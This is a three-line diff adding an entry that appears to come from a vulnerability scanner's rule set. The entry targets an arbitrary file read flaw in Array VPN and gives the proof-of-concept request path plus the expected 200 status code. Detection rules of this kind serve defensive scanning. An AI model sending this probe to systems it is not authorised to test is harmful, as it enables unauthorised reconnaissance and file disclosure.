@@ -1,0 +1,3 @@
+name: "Array VPN任意文件读取漏洞"
+poc: "/prx/000/http/localhost/client_sec"
+status_code: 200
